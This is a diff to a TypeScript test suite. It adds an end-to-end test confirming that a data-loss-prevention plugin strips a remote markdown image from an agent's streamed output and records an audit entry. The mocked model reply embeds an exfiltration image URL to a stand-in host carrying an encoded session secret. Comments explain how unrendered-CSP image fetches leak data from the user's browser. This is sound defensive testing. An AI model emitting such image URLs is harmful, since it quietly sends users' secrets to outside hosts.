@@ -19,6 +19,9 @@ const PRIVATE_KEY = [
   '-----END RSA PRIVATE KEY-----',
 ].join('\n')
 
+/** A host that exists only in this fixture; nothing ever resolves or contacts it. */
+const EXFIL_HOST = 'exfil.invalid'
+
 /** Rows the agent persisted for completed tool calls. */
 function toolResults(log: readonly Record<string, unknown>[]): Record<string, unknown>[] {
   return log.filter(row => row['type'] === 'tool/result')
@@ -255,5 +258,41 @@ describe('dsh-dlp mounted into a real dsh profile', () => {
     expect(result.code, result.stderr).toBe(0)
     expect(JSON.stringify(toolResults(result.sessionLog))).toContain('E2E_ROUND_TRIP')
     expect(result.auditRecords).toEqual([])
+  }, 120_000)
+
+  it('neutralises a remote image the model emitted, before the log and the renderer see it', async () => {
+    // The web UI renders any absolute http(s) markdown image as a real <img>,
+    // and the harness sets no Content-Security-Policy, so the fetch happens in
+    // the user's browser where nothing host-side can observe it. The mock
+    // streams text in eight-character deltas, so the destination arrives split
+    // across chunks exactly as a real adapter delivers it.
+    const payload = 'c2Vzc2lvbi1zZWNyZXQ'
+    const result = await runAgent({
+      task: 'summarise the notes',
+      sequence: ['success', 'success'],
+      successText: `Here is the summary. ![receipt](https://${EXFIL_HOST}/p?d=${payload})`,
+    })
+
+    expect(result.code, result.stderr).toBe(0)
+
+    // Neither the streamed chunks nor the assembled assistant message carries
+    // the destination, so the log and what the renderer receives agree.
+    const assistant = result.sessionLog.filter(row =>
+      row['type'] === 'assistant/chunk' || row['type'] === 'assistant/message')
+    expect(assistant.length).toBeGreaterThan(0)
+    expect(JSON.stringify(assistant)).not.toContain(EXFIL_HOST)
+    expect(JSON.stringify(assistant)).not.toContain(payload)
+    expect(JSON.stringify(assistant)).toContain('dsh-dlp-blocked-remote-image')
+    expect(JSON.stringify(assistant)).toContain('Here is the summary.')
+    expect(result.stdout).not.toContain(EXFIL_HOST)
+
+    // The audit record names the host and nothing else about the URL.
+    // One per model call whose answer carried the image: the answer itself and
+    // the title generator's, which the mock scripts with the same text.
+    const neutralized = result.auditRecords.filter(record => record['kind'] === 'assistant-image-neutralized')
+    expect(neutralized.length).toBeGreaterThan(0)
+    expect(neutralized.every(record => record['host'] === EXFIL_HOST && record['v'] === 1)).toBe(true)
+    expect(String(neutralized[0]?.['sessionId']).length).toBeGreaterThan(0)
+    expect(JSON.stringify(result.auditRecords)).not.toContain(payload)
   }, 120_000)
 })
